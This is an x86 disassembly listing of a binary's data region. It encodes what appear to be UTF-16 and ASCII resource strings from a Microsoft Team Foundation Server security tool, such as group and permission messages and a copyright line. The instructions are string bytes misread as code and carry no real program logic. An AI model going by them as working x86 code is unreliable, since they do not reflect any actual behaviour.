  405363:	add    BYTE PTR [edi+0x0],ch
  405366:	inc    ebx
  405367:	add    BYTE PTR [edi+0x0],ch
  40536a:	ins    DWORD PTR es:[edi],dx
  40536b:	add    BYTE PTR [ebp+0x0],ch
  40536e:	popa   
  40536f:	add    BYTE PTR [esi+0x0],ch
  405372:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  405377:	add    BYTE PTR [ebp+0x0],al
  40537a:	js     0x40537c
  40537c:	add    BYTE PTR gs:[ebx+0x0],ah
  405380:	jne    0x405382
  405382:	je     0x405384
  405384:	add    BYTE PTR gs:[edx+eiz*1+0x0],bh
  405389:	add    BYTE PTR [esi],ah
  40538b:	dec    esi
  40538c:	add    BYTE PTR [edi+0x0],ch
  40538f:	je     0x405391
  405391:	inc    ecx
  405392:	add    BYTE PTR [eax+0x0],dh
  405395:	jo     0x405397
  405397:	ins    BYTE PTR es:[edi],dx
  405398:	add    BYTE PTR [ecx+0x0],ch
  40539b:	arpl   WORD PTR [eax],ax
  40539d:	popa   
  40539e:	add    BYTE PTR [eax+eax*1+0x69],dh
  4053a2:	add    BYTE PTR [edi+0x0],ch
  4053a5:	outs   dx,BYTE PTR ds:[esi]
  4053a6:	add    BYTE PTR [edi+0x0],al
  4053a9:	jb     0x4053ab
  4053ab:	outs   dx,DWORD PTR ds:[esi]
  4053ac:	add    BYTE PTR [ebp+0x0],dh
  4053af:	jo     0x4053b1
  4053b1:	xchg   esp,eax
  4053b2:	and    al,BYTE PTR [eax]
  4053b4:	add    BYTE PTR [eax],bl
  4053b6:	dec    esi
  4053b7:	add    BYTE PTR [ebp+0x0],dh
  4053ba:	ins    BYTE PTR es:[edi],dx
  4053bb:	add    BYTE PTR [eax+eax*1+0x49],ch
  4053bf:	add    BYTE PTR [eax+eax*1+0x65],ah
  4053c3:	add    BYTE PTR [esi+0x0],ch
  4053c6:	je     0x4053c8
  4053c8:	imul   eax,DWORD PTR [eax],0x790074
  4053ce:	inc    edi
  4053cf:	and    al,0x0
  4053d1:	add    BYTE PTR [eax],bl
  4053d3:	push   eax
  4053d4:	add    BYTE PTR [edx+0x0],dh
  4053d7:	outs   dx,DWORD PTR ds:[esi]
  4053d8:	add    BYTE PTR [edx+0x0],ch
  4053db:	add    BYTE PTR gs:[ebx+0x0],ah
  4053df:	je     0x4053e1
  4053e1:	push   ebx
  4053e2:	add    BYTE PTR [ebx+0x0],ah
  4053e5:	outs   dx,DWORD PTR ds:[esi]
  4053e6:	add    BYTE PTR [eax+0x0],dh
  4053e9:	add    BYTE PTR gs:[esi+0x24],bl
  4053ed:	add    BYTE PTR [eax],al
  4053ef:	xor    BYTE PTR [ecx+0x0],dl
  4053f2:	inc    ecx
  4053f3:	add    BYTE PTR [ecx+0x0],al
  4053f6:	jne    0x4053f8
  4053f8:	je     0x4053fa
  4053fa:	outs   dx,DWORD PTR ds:[esi]
  4053fb:	add    BYTE PTR [ebp+0x0],ch
  4053fe:	popa   
  4053ff:	add    BYTE PTR [eax+eax*1+0x69],dh
  405403:	add    BYTE PTR [edi+0x0],ch
  405406:	outs   dx,BYTE PTR ds:[esi]
  405407:	add    BYTE PTR [ebp+0x0],cl
  40540a:	outs   dx,DWORD PTR ds:[esi]
  40540b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40540f:	add    BYTE PTR [eax+eax*1+0x45],ch
  405413:	add    BYTE PTR [esi+0x0],ch
  405416:	popa   
  405417:	add    BYTE PTR [edx+0x0],ah
  40541a:	ins    BYTE PTR es:[edi],dx
  40541b:	add    BYTE PTR [ebp+0x0],ah
  40541e:	add    BYTE PTR fs:[edi+0x24],ch
  405422:	add    BYTE PTR [eax],al
  405424:	xor    al,0x52
  405426:	add    BYTE PTR [ebp+0x0],ah
  405429:	ins    DWORD PTR es:[edi],dx
  40542a:	add    BYTE PTR [edi+0x0],ch
  40542d:	jbe    0x40542f
  40542f:	imul   eax,DWORD PTR [eax],0x67006e
  405435:	inc    ecx
  405436:	add    BYTE PTR [ebx+0x0],ah
  405439:	arpl   WORD PTR [eax],ax
  40543b:	add    BYTE PTR gs:[ebx+0x0],dh
  40543f:	jae    0x405441
  405441:	inc    ebx
  405442:	add    BYTE PTR [edi+0x0],ch
  405445:	outs   dx,BYTE PTR ds:[esi]
  405446:	add    BYTE PTR [eax+eax*1+0x72],dh
  40544a:	add    BYTE PTR [edi+0x0],ch
  40544d:	ins    BYTE PTR es:[edi],dx
  40544e:	add    BYTE PTR [ebp+0x0],al
  405451:	outs   dx,BYTE PTR ds:[esi]
  405452:	add    BYTE PTR [eax+eax*1+0x72],dh
  405456:	add    BYTE PTR [ecx+0x0],bh
  405459:	ret    
  40545a:	and    al,0x0
  40545c:	add    BYTE PTR [esi],ch
  40545e:	push   edx
  40545f:	add    BYTE PTR [ebp+0x0],ah
  405462:	ins    DWORD PTR es:[edi],dx
  405463:	add    BYTE PTR [edi+0x0],ch
  405466:	jbe    0x405468
  405468:	imul   eax,DWORD PTR [eax],0x67006e
  40546e:	dec    ebp
  40546f:	add    BYTE PTR [ebp+0x0],ah
  405472:	ins    DWORD PTR es:[edi],dx
  405473:	add    BYTE PTR [edx+0x0],ah
  405476:	add    BYTE PTR gs:[edx+0x0],dh
  40547a:	inc    esi
  40547b:	add    BYTE PTR [edx+0x0],dh
  40547e:	outs   dx,DWORD PTR ds:[esi]
  40547f:	add    BYTE PTR [ebp+0x0],ch
  405482:	inc    edi
  405483:	add    BYTE PTR [edx+0x0],dh
  405486:	outs   dx,DWORD PTR ds:[esi]
  405487:	add    BYTE PTR [ebp+0x0],dh
  40548a:	jo     0x40548c
  40548c:	jmp    0x304054b5
  405491:	push   edx
  405492:	add    BYTE PTR [ebp+0x0],ah
  405495:	outs   dx,BYTE PTR ds:[esi]
  405496:	add    BYTE PTR [ecx+0x0],ah
  405499:	ins    DWORD PTR es:[edi],dx
  40549a:	add    BYTE PTR [ecx+0x0],ch
  40549d:	outs   dx,BYTE PTR ds:[esi]
  40549e:	add    BYTE PTR [edi+0x0],ah
  4054a1:	inc    ecx
  4054a2:	add    BYTE PTR [eax+0x0],dh
  4054a5:	jo     0x4054a7
  4054a7:	ins    BYTE PTR es:[edi],dx
  4054a8:	add    BYTE PTR [ecx+0x0],ch
  4054ab:	arpl   WORD PTR [eax],ax
  4054ad:	popa   
  4054ae:	add    BYTE PTR [eax+eax*1+0x69],dh
  4054b2:	add    BYTE PTR [edi+0x0],ch
  4054b5:	outs   dx,BYTE PTR ds:[esi]
  4054b6:	add    BYTE PTR [edi+0x0],al
  4054b9:	jb     0x4054bb
  4054bb:	outs   dx,DWORD PTR ds:[esi]
  4054bc:	add    BYTE PTR [ebp+0x0],dh
  4054bf:	jo     0x4054c1
  4054c1:	add    esp,DWORD PTR ds:0x52220000
  4054c7:	add    BYTE PTR [ebp+0x0],ah
  4054ca:	jae    0x4054cc
  4054cc:	outs   dx,DWORD PTR ds:[esi]
  4054cd:	add    BYTE PTR [eax+eax*1+0x76],ch
  4054d1:	add    BYTE PTR [ecx+0x0],ch
  4054d4:	outs   dx,BYTE PTR ds:[esi]
  4054d5:	add    BYTE PTR [edi+0x0],ah
  4054d8:	dec    ecx
  4054d9:	add    BYTE PTR [eax+eax*1+0x65],ah
  4054dd:	add    BYTE PTR [esi+0x0],ch
  4054e0:	je     0x4054e2
  4054e2:	imul   eax,DWORD PTR [eax],0x790074
  4054e8:	es and eax,0x52360000
  4054ee:	add    BYTE PTR [ebp+0x0],ah
  4054f1:	je     0x4054f3
  4054f3:	jb     0x4054f5
  4054f5:	imul   eax,DWORD PTR [eax],0x760065
  4054fb:	imul   eax,DWORD PTR [eax],0x67006e
  405501:	inc    ecx
  405502:	add    BYTE PTR [ebx+0x0],ah
  405505:	arpl   WORD PTR [eax],ax
  405507:	add    BYTE PTR gs:[ebx+0x0],dh
  40550b:	jae    0x40550d
  40550d:	inc    ebx
  40550e:	add    BYTE PTR [edi+0x0],ch
  405511:	outs   dx,BYTE PTR ds:[esi]
  405512:	add    BYTE PTR [eax+eax*1+0x72],dh
  405516:	add    BYTE PTR [edi+0x0],ch
  405519:	ins    BYTE PTR es:[edi],dx
  40551a:	add    BYTE PTR [eax+eax*1+0x69],cl
  40551e:	add    BYTE PTR [ebx+0x0],dh
  405521:	je     0x405523
  405523:	inc    ebx
  405524:	and    eax,0x52360000
  405529:	add    BYTE PTR [ebp+0x0],ah
  40552c:	je     0x40552e
  40552e:	jb     0x405530
  405530:	imul   eax,DWORD PTR [eax],0x760065
  405536:	imul   eax,DWORD PTR [eax],0x67006e
  40553c:	inc    ecx
  40553d:	add    BYTE PTR [eax+0x0],dh
  405540:	jo     0x405542
  405542:	ins    BYTE PTR es:[edi],dx
  405543:	add    BYTE PTR [ecx+0x0],ch
  405546:	arpl   WORD PTR [eax],ax
  405548:	popa   
  405549:	add    BYTE PTR [eax+eax*1+0x69],dh
  40554d:	add    BYTE PTR [edi+0x0],ch
  405550:	outs   dx,BYTE PTR ds:[esi]
  405551:	add    BYTE PTR [edi+0x0],al
  405554:	jb     0x405556
  405556:	outs   dx,DWORD PTR ds:[esi]
  405557:	add    BYTE PTR [ebp+0x0],dh
  40555a:	jo     0x40555c
  40555c:	jae    0x40555e
  40555e:	jnp    0x405585
  405560:	add    BYTE PTR [eax],al
  405562:	cmp    dl,BYTE PTR [ebx+0x0]
  405565:	add    BYTE PTR gs:[ebx+0x0],ah
  405569:	jne    0x40556b
  40556b:	jb     0x40556d
  40556d:	imul   eax,DWORD PTR [eax],0x790074
  405573:	dec    esi
  405574:	add    BYTE PTR [ecx+0x0],ah
  405577:	ins    DWORD PTR es:[edi],dx
  405578:	add    BYTE PTR [ebp+0x0],ah
  40557b:	jae    0x40557d
  40557d:	jo     0x40557f
  40557f:	popa   
  405580:	add    BYTE PTR [ebx+0x0],ah
  405583:	add    BYTE PTR gs:[eax+eax*1+0x6f],al
  405588:	add    BYTE PTR [ebp+0x0],ah
  40558b:	jae    0x40558d
  40558d:	dec    esi
  40558e:	add    BYTE PTR [edi+0x0],ch
  405591:	je     0x405593
  405593:	inc    ebp
  405594:	add    BYTE PTR [eax+0x0],bh
  405597:	imul   eax,DWORD PTR [eax],0x740073
  40559d:	les    esp,FWORD PTR ds:0x53160000
  4055a3:	add    BYTE PTR [eax+0x0],ch
  4055a6:	outs   dx,DWORD PTR ds:[esi]
  4055a7:	add    BYTE PTR [edi+0x0],dh
  4055aa:	inc    ecx
  4055ab:	add    BYTE PTR [ebx+0x0],ah
  4055ae:	je     0x4055b0
  4055b0:	imul   eax,DWORD PTR [eax],0x6e006f
  4055b6:	jae    0x4055b8
  4055b8:	lock and eax,0x531c0000
  4055be:	add    BYTE PTR [eax+0x0],ch
  4055c1:	outs   dx,DWORD PTR ds:[esi]
  4055c2:	add    BYTE PTR [edi+0x0],dh
  4055c5:	dec    esi
  4055c6:	add    BYTE PTR [ecx+0x0],ah
  4055c9:	ins    DWORD PTR es:[edi],dx
  4055ca:	add    BYTE PTR [ebp+0x0],ah
  4055cd:	jae    0x4055cf
  4055cf:	jo     0x4055d1
  4055d1:	popa   
  4055d2:	add    BYTE PTR [ebx+0x0],ah
  4055d5:	add    BYTE PTR gs:[ebx+0x0],dh
  4055d9:	xor    al,0x26
  4055db:	add    BYTE PTR [eax],al
  4055dd:	inc    esp
  4055de:	push   ebx
  4055df:	add    BYTE PTR [ebp+0x0],dh
  4055e2:	jo     0x4055e4
  4055e4:	add    BYTE PTR gs:[edx+0x0],dh
  4055e8:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  4055ed:	add    BYTE PTR [edi+0x0],ch
  4055f0:	jne    0x4055f2
  4055f2:	jae    0x4055f4
  4055f4:	inc    ebx
  4055f5:	add    BYTE PTR [edi+0x0],ch
  4055f8:	ins    DWORD PTR es:[edi],dx
  4055f9:	add    BYTE PTR [ebp+0x0],ch
  4055fc:	popa   
  4055fd:	add    BYTE PTR [esi+0x0],ch
  405600:	add    BYTE PTR fs:[eax+0x0],dl
  405604:	popa   
  405605:	add    BYTE PTR [edx+0x0],dh
  405608:	popa   
  405609:	add    BYTE PTR [ebp+0x0],ch
  40560c:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  405611:	add    BYTE PTR [edx+0x0],dh
  405614:	dec    ecx
  405615:	add    BYTE PTR [edi+0x0],ah
  405618:	outs   dx,BYTE PTR ds:[esi]
  405619:	add    BYTE PTR [edi+0x0],ch
  40561c:	jb     0x40561e
  40561e:	add    BYTE PTR gs:[eax+eax*1-0x7a],ah
  405623:	add    BYTE PTR es:[eax],al
  405626:	inc    esi
  405627:	push   ebx
  405628:	add    BYTE PTR [ebp+0x0],dh
  40562b:	jo     0x40562d
  40562d:	add    BYTE PTR gs:[edx+0x0],dh
  405631:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  405636:	add    BYTE PTR [edi+0x0],ch
  405639:	jne    0x40563b
  40563b:	jae    0x40563d
  40563d:	inc    ebx
  40563e:	add    BYTE PTR [edi+0x0],ch
  405641:	ins    DWORD PTR es:[edi],dx
  405642:	add    BYTE PTR [ebp+0x0],ch
  405645:	popa   
  405646:	add    BYTE PTR [esi+0x0],ch
  405649:	add    BYTE PTR fs:[eax+0x0],dl
  40564d:	popa   
  40564e:	add    BYTE PTR [edx+0x0],dh
  405651:	popa   
  405652:	add    BYTE PTR [ebp+0x0],ch
  405655:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40565a:	add    BYTE PTR [edx+0x0],dh
  40565d:	jae    0x40565f
  40565f:	dec    ecx
  405660:	add    BYTE PTR [edi+0x0],ah
  405663:	outs   dx,BYTE PTR ds:[esi]
  405664:	add    BYTE PTR [edi+0x0],ch
  405667:	jb     0x405669
  405669:	add    BYTE PTR gs:[eax+eax*1-0x48],ah
  40566e:	add    BYTE PTR es:[eax],al
  405671:	ds push ebx
  405673:	add    BYTE PTR [ebp+0x0],dh
  405676:	jo     0x405678
  405678:	add    BYTE PTR gs:[edx+0x0],dh
  40567c:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  405681:	add    BYTE PTR [edi+0x0],ch
  405684:	jne    0x405686
  405686:	jae    0x405688
  405688:	inc    ebx
  405689:	add    BYTE PTR [edi+0x0],ch
  40568c:	ins    DWORD PTR es:[edi],dx
  40568d:	add    BYTE PTR [ebp+0x0],ch
  405690:	popa   
  405691:	add    BYTE PTR [esi+0x0],ch
  405694:	add    BYTE PTR fs:[ebx+0x0],dl
  405698:	ja     0x40569a
  40569a:	imul   eax,DWORD PTR [eax],0x630074
  4056a0:	push   0x67004900
  4056a5:	add    BYTE PTR [esi+0x0],ch
  4056a8:	outs   dx,DWORD PTR ds:[esi]
  4056a9:	add    BYTE PTR [edx+0x0],dh
  4056ac:	add    BYTE PTR gs:[eax+eax*1-0x12],ah
  4056b1:	add    BYTE PTR es:[eax],al
  4056b4:	push   edx
  4056b5:	push   ebx
  4056b6:	add    BYTE PTR [ebp+0x0],dh
  4056b9:	jo     0x4056bb
  4056bb:	add    BYTE PTR gs:[edx+0x0],dh
  4056bf:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  4056c4:	add    BYTE PTR [edi+0x0],ch
  4056c7:	jne    0x4056c9
  4056c9:	jae    0x4056cb
  4056cb:	inc    ebx
  4056cc:	add    BYTE PTR [edi+0x0],ch
  4056cf:	ins    DWORD PTR es:[edi],dx
  4056d0:	add    BYTE PTR [ebp+0x0],ch
  4056d3:	popa   
  4056d4:	add    BYTE PTR [esi+0x0],ch
  4056d7:	add    BYTE PTR fs:[ebx+0x0],dl
  4056db:	ja     0x4056dd
  4056dd:	imul   eax,DWORD PTR [eax],0x630074
  4056e3:	push   0x67004900
  4056e8:	add    BYTE PTR [esi+0x0],ch
  4056eb:	outs   dx,DWORD PTR ds:[esi]
  4056ec:	add    BYTE PTR [edx+0x0],dh
  4056ef:	add    BYTE PTR gs:[eax+eax*1+0x57],ah
  4056f4:	add    BYTE PTR [ecx+0x0],ch
  4056f7:	je     0x4056f9
  4056f9:	push   0x6f004400
  4056fe:	add    BYTE PTR [ebp+0x0],ch
  405701:	popa   
  405702:	add    BYTE PTR [ecx+0x0],ch
  405705:	outs   dx,BYTE PTR ds:[esi]
  405706:	add    BYTE PTR [ecx],ah
  405708:	daa    
  405709:	add    BYTE PTR [eax],al
  40570b:	xor    BYTE PTR [ebx+0x0],dl
  40570e:	jne    0x405710
  405710:	jo     0x405712
  405712:	add    BYTE PTR gs:[edx+0x0],dh
  405716:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40571b:	add    BYTE PTR [edi+0x0],ch
  40571e:	jne    0x405720
  405720:	jae    0x405722
  405722:	push   ebx
  405723:	add    BYTE PTR [edi+0x0],dh
  405726:	imul   eax,DWORD PTR [eax],0x630074
  40572c:	push   0x67004900
  405731:	add    BYTE PTR [esi+0x0],ch
  405734:	outs   dx,DWORD PTR ds:[esi]
  405735:	add    BYTE PTR [edx+0x0],dh
  405738:	add    BYTE PTR gs:[eax+eax*1+0x57],ah
  40573d:	daa    
  40573e:	add    BYTE PTR [eax],al
  405740:	push   ds
  405741:	push   esp
  405742:	add    BYTE PTR [ecx+0x0],ah
  405745:	jb     0x405747
  405747:	add    BYTE PTR [di+0x0],ah
  40574b:	je     0x40574d
  40574d:	push   esp
  40574e:	add    BYTE PTR [esi+0x0],al
  405751:	push   ebx
  405752:	add    BYTE PTR [eax+eax*1+0x6f],al
  405756:	add    BYTE PTR [ebp+0x0],ch
  405759:	popa   
  40575a:	add    BYTE PTR [ecx+0x0],ch
  40575d:	outs   dx,BYTE PTR ds:[esi]
  40575e:	add    BYTE PTR [ebp+0xe000027],dl
  405764:	push   ebp
  405765:	add    BYTE PTR [esi+0x0],ch
  405768:	imul   eax,DWORD PTR [eax],0x6e
  40576b:	add    BYTE PTR [edi+0x0],ch
  40576e:	ja     0x405770
  405770:	outs   dx,BYTE PTR ds:[esi]
  405771:	add    al,al
  405773:	daa    
  405774:	add    BYTE PTR [eax],al
  405776:	inc    edx
  405777:	push   ebp
  405778:	add    BYTE PTR [ebx+0x0],dh
  40577b:	imul   eax,DWORD PTR [eax],0x67006e
  405781:	inc    ecx
  405782:	add    BYTE PTR [ebp+0x0],dh
  405785:	je     0x405787
  405787:	push   0x72006f00
  40578c:	add    BYTE PTR [ecx+0x0],ch
  40578f:	jp     0x405791
  405791:	popa   
  405792:	add    BYTE PTR [eax+eax*1+0x69],dh
  405796:	add    BYTE PTR [edi+0x0],ch
  405799:	outs   dx,BYTE PTR ds:[esi]
  40579a:	add    BYTE PTR [edx+0x0],al
  40579d:	add    BYTE PTR gs:[ebx+0x0],ah
  4057a1:	popa   
  4057a2:	add    BYTE PTR [ebp+0x0],dh
  4057a5:	jae    0x4057a7
  4057a7:	add    BYTE PTR gs:[edi+0x0],cl
  4057ab:	data16 add BYTE PTR [esi+0x0],al
  4057af:	outs   dx,DWORD PTR ds:[esi]
  4057b0:	add    BYTE PTR [edx+0x0],dh
  4057b3:	ins    DWORD PTR es:[edi],dx
  4057b4:	add    BYTE PTR [ecx+0x0],ah
  4057b7:	je     0x4057b9
  4057b9:	leave  
  4057ba:	daa    
  4057bb:	add    BYTE PTR [eax],al
  4057bd:	adc    dl,BYTE PTR [esi+0x0]
  4057c0:	add    BYTE PTR gs:[edx+0x0],dh
  4057c4:	imul   eax,DWORD PTR [eax],0x790066
  4057ca:	imul   eax,DWORD PTR [eax],0x67006e
  4057d0:	sub    al,0x28
  4057d2:	add    BYTE PTR [eax],al
  4057d4:	push   cs
  4057d5:	push   edi
  4057d6:	add    BYTE PTR [ecx+0x0],ah
  4057d9:	jb     0x4057db
  4057db:	outs   dx,BYTE PTR ds:[esi]
  4057dc:	add    BYTE PTR [ecx+0x0],ch
  4057df:	outs   dx,BYTE PTR ds:[esi]
  4057e0:	add    BYTE PTR [edi+0x0],ah
  4057e3:	cmp    ch,BYTE PTR [eax]
  4057e5:	add    BYTE PTR [eax],al
  4057e7:	sbb    BYTE PTR [edi+0x0],dl
  4057ea:	imul   eax,DWORD PTR [eax],0x64006e
  4057f0:	outs   dx,DWORD PTR ds:[esi]
  4057f1:	add    BYTE PTR [edi+0x0],dh
  4057f4:	jae    0x4057f6
  4057f6:	inc    edi
  4057f7:	add    BYTE PTR [edx+0x0],dh
  4057fa:	outs   dx,DWORD PTR ds:[esi]
  4057fb:	add    BYTE PTR [ebp+0x0],dh
  4057fe:	jo     0x405800
  405800:	dec    eax
  405801:	sub    BYTE PTR [eax],al
  405803:	add    BYTE PTR [esi],dl
  405805:	push   edi
  405806:	add    BYTE PTR [ecx+0x0],ch
  405809:	outs   dx,BYTE PTR ds:[esi]
  40580a:	add    BYTE PTR [eax+eax*1+0x6f],ah
  40580e:	add    BYTE PTR [edi+0x0],dh
  405811:	jae    0x405813
  405813:	push   ebp
  405814:	add    BYTE PTR [ebx+0x0],dh
  405817:	add    BYTE PTR gs:[edx+0x0],dh
  40581b:	push   edi
  40581c:	sub    BYTE PTR [eax],al
  40581e:	add    BYTE PTR [ecx],al
  405820:	and    al,0x41
  405822:	arpl   WORD PTR [ebx+0x65],sp
  405825:	jae    0x40589a
  405827:	and    BYTE PTR [ebx+0x6f],al
  40582a:	outs   dx,BYTE PTR ds:[esi]
  40582b:	je     0x40589f
  40582d:	outs   dx,DWORD PTR ds:[esi]
  40582e:	ins    BYTE PTR es:[edi],dx
  40582f:	and    BYTE PTR [ecx+ebp*2+0x73],cl
  405833:	je     0x405855
  405835:	outs   dx,DWORD PTR ds:[esi]
  405836:	outs   dx,BYTE PTR ds:[esi]
  405837:	and    BYTE PTR [edi+0x62],ch
  40583a:	push   0x65
  40583c:	arpl   WORD PTR [eax+eiz*1+0x22],si
  405840:	jnp    0x405872
  405842:	jge    0x405866
  405844:	cmp    al,BYTE PTR [ecx]
  405846:	adc    BYTE PTR [ecx+0x20],ah
  405849:	ins    DWORD PTR es:[edi],dx
  40584a:	gs ins DWORD PTR es:[edi],dx
  40584c:	bound  esp,QWORD PTR [ebp+0x72]
  40584f:	and    BYTE PTR [edi+0x66],ch
  405852:	and    BYTE PTR [ebx+0x30],bh
  405855:	jge    0x405885
  405857:	add    DWORD PTR [edx],esp
  405859:	inc    ecx
  40585a:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x65687420
  405863:	and    BYTE PTR [ecx+0x63],ah
  405866:	arpl   WORD PTR [ebp+0x73],sp
  405869:	jae    0x40588b
  40586b:	arpl   WORD PTR [edi+0x6e],bp
  40586e:	je     0x4058e2
  405870:	outs   dx,DWORD PTR ds:[esi]
  405871:	ins    BYTE PTR es:[edi],dx
  405872:	and    BYTE PTR [ebp+0x6e],ah
  405875:	je     0x4058e9
  405877:	jns    0x4058a7
  405879:	cs add DWORD PTR cs:[ecx+eax*2],edx
  40587e:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x7d307b20
  405887:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40588b:	jnp    0x4058be
  40588d:	jge    0x4058bd
  40588f:	cs add DWORD PTR cs:[eax],ebp
  405893:	push   esp
  405894:	gs popa 
  405896:	ins    DWORD PTR es:[edi],dx
  405897:	and    BYTE PTR [esi+0x6f],al
  40589a:	jne    0x40590a
  40589c:	fs popa 
  40589e:	je     0x405909
  4058a0:	outs   dx,DWORD PTR ds:[esi]
  4058a1:	outs   dx,BYTE PTR ds:[esi]
  4058a2:	and    BYTE PTR [ebx+0x65],dl
  4058a5:	jb     0x40591d
  4058a7:	gs jb  0x4058ca
  4058aa:	popa   
  4058ab:	jo     0x40591d
  4058ad:	ins    BYTE PTR es:[edi],dx
  4058ae:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4058b5:	and    BYTE PTR [edi+0x72],ah
  4058b8:	outs   dx,DWORD PTR ds:[esi]
  4058b9:	jne    0x40592b
  4058bb:	add    DWORD PTR [ebx+eax*2],esi
  4058be:	push   0x696b6365
  4058c3:	outs   dx,BYTE PTR ds:[esi]
  4058c4:	and    BYTE PTR [si+0x68],dh
  4058c8:	and    BYTE PTR gs:[ebp+eiz*2+0x73],ah
  4058cd:	arpl   WORD PTR [edx+0x69],si
  4058d0:	jo     0x405946
  4058d2:	imul   ebp,DWORD PTR [edi+0x6e],0x20666f20
  4058d9:	je     0x405943
  4058db:	and    BYTE PTR gs:[ecx+0x70],ah
  4058df:	jo     0x40594d
  4058e1:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4058e8:	and    BYTE PTR [edi+0x72],ah
  4058eb:	outs   dx,DWORD PTR ds:[esi]
  4058ec:	jne    0x40595e
  4058ee:	cs cs add DWORD PTR cs:[ebx+eax*2],ebx
  4058f4:	push   0x696b6365
  4058f9:	outs   dx,BYTE PTR ds:[esi]
  4058fa:	and    BYTE PTR [bx+0x72],ah
  4058fe:	outs   dx,DWORD PTR ds:[esi]
  4058ff:	jne    0x405971
  405901:	and    BYTE PTR [ebp+0x65],ch
  405904:	ins    DWORD PTR es:[edi],dx
  405905:	bound  esp,QWORD PTR [ebp+0x72]
  405908:	jae    0x405972
  40590a:	imul   esi,DWORD PTR [eax+0x2e],0x7e012e2e
  405911:	dec    ebp
  405912:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405919:	je     0x40593b
  40591b:	sub    BYTE PTR [edx+0x29],dl
  40591e:	and    BYTE PTR [esi+eax*2+0x53],dl
  405922:	push   ebx
  405923:	arpl   WORD PTR gs:[ebp+0x72],si
  405927:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6554202d
  40592f:	popa   
  405930:	ins    DWORD PTR es:[edi],dx
  405931:	and    BYTE PTR [esi+0x6f],al
  405934:	jne    0x4059a4
  405936:	fs popa 
  405938:	je     0x4059a3
  40593a:	outs   dx,DWORD PTR ds:[esi]
  40593b:	outs   dx,BYTE PTR ds:[esi]
  40593c:	and    BYTE PTR [ebx+0x65],dl
  40593f:	jb     0x4059b7
  405941:	gs jb  0x405964
  405944:	push   ebx
  405945:	arpl   WORD PTR gs:[ebp+0x72],si
  405949:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6c6f6f54
  405951:	or     eax,0x706f430a
  405956:	jns    0x4059ca
  405958:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40595f:	sub    DWORD PTR [eax],esp
  405961:	dec    ebp
  405962:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405969:	je     0x40598b
  40596b:	inc    ebx
  40596c:	outs   dx,DWORD PTR ds:[esi]
  40596d:	jb     0x4059df
  40596f:	outs   dx,DWORD PTR ds:[esi]
  405970:	jb     0x4059d3
  405972:	je     0x4059dd
  405974:	outs   dx,DWORD PTR ds:[esi]
  405975:	outs   dx,BYTE PTR ds:[esi]
  405976:	and    BYTE PTR cs:[eax],ah
  405979:	inc    ecx
  40597a:	ins    BYTE PTR es:[edi],dx
  40597b:	ins    BYTE PTR es:[edi],dx
  40597c:	and    BYTE PTR [edx+0x69],dh
  40597f:	addr16 push 0x72207374
  405985:	gs jae 0x4059ed
  405988:	jb     0x405a00
  40598a:	gs fs cs or eax,0x4330010a
  405992:	jb     0x4059f9
  405994:	popa   
  405995:	je     0x405a00
  405997:	outs   dx,BYTE PTR ds:[esi]
  405998:	and    BYTE PTR [bp+di+0x65],dh
  40599c:	jb     0x405a14
  40599e:	gs jb  0x4059ce
  4059a1:	jae    0x405a06
  4059a3:	outs   dx,DWORD PTR ds:[esi]
  4059a4:	jo     0x405a0b
  4059a6:	and    BYTE PTR [ecx+0x70],ah
  4059a9:	jo     0x405a17
  4059ab:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4059b2:	and    BYTE PTR [edi+0x72],ah
  4059b5:	outs   dx,DWORD PTR ds:[esi]
  4059b6:	jne    0x405a28
  4059b8:	and    BYTE PTR [edx],ah
  4059ba:	jnp    0x4059ec
  4059bc:	jge    0x4059e0
  4059be:	cs cs add DWORD PTR cs:[ecx],esi
  4059c3:	inc    ebx
  4059c4:	jb     0x405a2b
  4059c6:	popa   
  4059c7:	je     0x405a32
  4059c9:	outs   dx,BYTE PTR ds:[esi]
  4059ca:	and    BYTE PTR [bx+si+0x72],dh
  4059ce:	outs   dx,DWORD PTR ds:[esi]
  4059cf:	push   0x65
  4059d1:	arpl   WORD PTR [ebp+ebp*1+0x6c],si
  4059d5:	outs   dx,DWORD PTR ds:[esi]
  4059d6:	arpl   WORD PTR [ecx+0x6c],sp
  4059d9:	and    BYTE PTR [ecx+0x70],ah
  4059dc:	jo     0x405a4a
  4059de:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4059e5:	and    BYTE PTR [edi+0x72],ah
  4059e8:	outs   dx,DWORD PTR ds:[esi]
  4059e9:	jne    0x405a5b
  4059eb:	and    BYTE PTR [edx],ah
  4059ed:	jnp    0x405a1f
  4059ef:	jge    0x405a13
  4059f1:	cs cs add DWORD PTR cs:[ecx],esp
  4059f6:	inc    esp
  4059f7:	gs ins BYTE PTR es:[edi],dx
  4059f9:	gs je  0x405a65
  4059fc:	outs   dx,BYTE PTR ds:[esi]
  4059fd:	and    BYTE PTR [si+0x68],dh
  405a01:	and    BYTE PTR gs:[ecx+0x70],ah
  405a05:	jo     0x405a73
  405a07:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  405a0e:	and    BYTE PTR [edi+0x72],ah
  405a11:	outs   dx,DWORD PTR ds:[esi]
  405a12:	jne    0x405a84
  405a14:	cs cs add DWORD PTR cs:[edi],ecx
  405a19:	and    BYTE PTR [eax],ah
  405a1b:	inc    esp
  405a1c:	gs jae 0x405a82
  405a1f:	jb     0x405a8a
  405a21:	jo     0x405a97
  405a23:	imul   ebp,DWORD PTR [edi+0x6e],0xf01203a
  405a2a:	and    BYTE PTR [ecx+ebp*2+0x73],al
